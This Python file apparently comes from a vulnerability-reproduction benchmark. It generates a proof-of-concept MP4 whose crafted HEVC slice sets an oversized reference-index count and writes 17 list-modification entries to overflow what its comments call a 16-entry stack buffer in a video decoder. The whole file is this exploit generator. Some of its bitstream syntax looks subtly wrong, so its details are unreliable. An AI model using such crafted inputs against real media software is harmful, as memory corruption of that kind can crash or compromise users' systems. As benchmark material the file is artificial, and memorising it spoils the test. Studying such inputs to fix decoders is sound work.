import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        class BitWriter:
            def __init__(self):
                self.bits = []

            def write(self, value, num_bits):
                for i in range(num_bits - 1, -1, -1):
                    self.bits.append((value >> i) & 1)

            def write_ue(self, value):
                # Unsigned exponential-Golomb
                if value == 0:
                    self.bits.append(1)
                    return
                
                temp_val = value + 1
                num_bits = temp_val.bit_length()
                leading_zeros = num_bits - 1
                self.write(0, leading_zeros)
                self.write(temp_val, num_bits)
                
            def get_bytes(self):
                # RBSP trailing bits: stop bit '1' then '0's to be byte-aligned
                self.bits.append(1)
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                byte_data = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte_val = 0
                    for j in range(8):
                        byte_val = (byte_val << 1) | self.bits[i + j]
                    byte_data.append(byte_val)
                return bytes(byte_data)

        def box(box_type, content):
            return struct.pack('>I', len(content) + 8) + box_type + content

        def full_box(box_type, version, flags, content):
            return box(box_type, struct.pack('>I', (version << 24) | flags) + content)

        # Minimal HEVC NAL units
        vps_nalu = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\x80\x00\x00\x03\x00\x00\x03\x00\x7b\xac\x09'
        sps_nalu = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\x80\x00\x00\x03\x00\x00\x03\x00\x7b\xa0\x03\xc0\x80\x11\x07\xcb\x96\xb4\x93\x20'
        pps_nalu = b'\x44\x01\xc0\xf1\x80\x00'

        # Malicious slice NALU targeting the stack buffer overflow
        bw = BitWriter()
        bw.write(1, 1)      # first_slice_segment_in_pic_flag
        bw.write(0, 1)      # no_output_of_prior_pics_flag
        bw.write_ue(0)      # slice_pic_parameter_set_id
        bw.write_ue(1)      # slice_type (P-slice)
        # SPS has log2_max_pic_order_cnt_lsb_minus4=7, so slice_pic_order_cnt_lsb is 11 bits
        bw.write(0, 11)     
        bw.write(0, 1)      # short_term_ref_pic_set_sps_flag = 0
        # Minimal local short_term_ref_pic_set
        bw.write_ue(0)      # inter_ref_pic_set_prediction_flag = 0
        bw.write_ue(0)      # num_negative_pics
        bw.write_ue(0)      # num_positive_pics
        bw.write(1, 1)      # num_ref_idx_active_override_flag = 1
        # Set num_ref_idx_l0_active_minus1 to a large value to cause overflow
        bw.write_ue(31)     # num_ref_idx_l0_active_minus1 = 31 (buffer size is 16)
        bw.write(1, 1)      # ref_pic_list_modification_flag_l0 = 1
        # Write 17 list entries to overflow the buffer
        for _ in range(17): 
            bw.write(1, 1)  # list_modification_present_flag
            bw.write_ue(0)  # list_entry
        bw.write(0, 1)      # End modification loop
        
        slice_data = bw.get_bytes()
        slice_nalu = b'\x02\x01' + slice_data # P-Slice NALU Header (nal_unit_type=1)
        
        # Build a minimal MP4 file structure
        ftyp = box(b'ftyp', b'isom\x00\x00\x02\x00isomiso2hvc1mp41')

        # hvcC box containing decoder configuration
        hvcc = (b'\x01\x01\x60\x00\x00\x03\x00\x80\x00\x00\x03\x00\x00\x03\x00\x7b'
                b'\xb0\x00\xfc\xfd\xf8\xf8\x00\x00\x03'
                b'\x20' + struct.pack('>H', 1) + struct.pack('>H', len(vps_nalu)) + vps_nalu +
                b'\x21' + struct.pack('>H', 1) + struct.pack('>H', len(sps_nalu)) + sps_nalu +
                b'\x22' + struct.pack('>H', 1) + struct.pack('>H', len(pps_nalu)) + pps_nalu)

        mvhd = full_box(b'mvhd', 0, 0,
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xe8\x00\x00\x00\x01'
            b'\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x00\x00\x02')
        tkhd = full_box(b'tkhd', 0, 7,
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00'
            b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'\x40\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00')
        mdhd = full_box(b'mdhd', 0, 0,
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xe8\x00\x00\x00\x01'
            b'\x55\xc4\x00\x00')
        hdlr = full_box(b'hdlr', 0, 0,
            b'\x00\x00\x00\x00vide\x00\x00\x00\x00\x00\x00\x00\x00VideoHandler\x00')
        
        stsd_entry = (b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00'
                      b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x10\x00\x48\x00\x00'
                      b'\x00\x48\x00\x00\x00\x00\x00\x00\x00\x01' + b'poc\x00'*8 + b'\x00' +
                      b'\x00\x18\xff\xff' + box(b'hvcC', hvcc))
        stsd = full_box(b'stsd', 0, 0, b'\x00\x00\x00\x01' + box(b'hvc1', stsd_entry))
        stts = full_box(b'stts', 0, 0, b'\x00\x00\x00\x00')
        stsc = full_box(b'stsc', 0, 0, b'\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01')
        stsz = full_box(b'stsz', 0, 0, b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(slice_nalu)))
        
        dref = full_box(b'dref', 0, 0, b'\x00\x00\x00\x01' + full_box(b'url ', 0, 1, b''))
        dinf = box(b'dinf', dref)
        vmhd = full_box(b'vmhd', 0, 1, b'\x00\x00\x00\x00\x00\x00\x00\x00')

        stbl_dummy = box(b'stbl', stsd + stts + stsc + stsz + full_box(b'stco', 0, 0, b'\x00\x00\x00\x01\x00\x00\x00\x00'))
        minf_dummy = box(b'minf', vmhd + dinf + stbl_dummy)
        mdia_dummy = box(b'mdia', mdhd + hdlr + minf_dummy)
        trak_dummy = box(b'trak', tkhd + mdia_dummy)
        moov_dummy = box(b'moov', mvhd + trak_dummy)
        
        offset = len(ftyp) + len(moov_dummy) + 8

        stco = full_box(b'stco', 0, 0, b'\x00\x00\x00\x01' + struct.pack('>I', offset))
        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = box(b'minf', vmhd + dinf + stbl)
        mdia = box(b'mdia', mdhd + hdlr + minf)
        trak = box(b'trak', tkhd + mdia)
        moov = box(b'moov', mvhd + trak)
        
        mdat = box(b'mdat', struct.pack('>I', len(slice_nalu)) + slice_nalu)

        return ftyp + moov + mdat
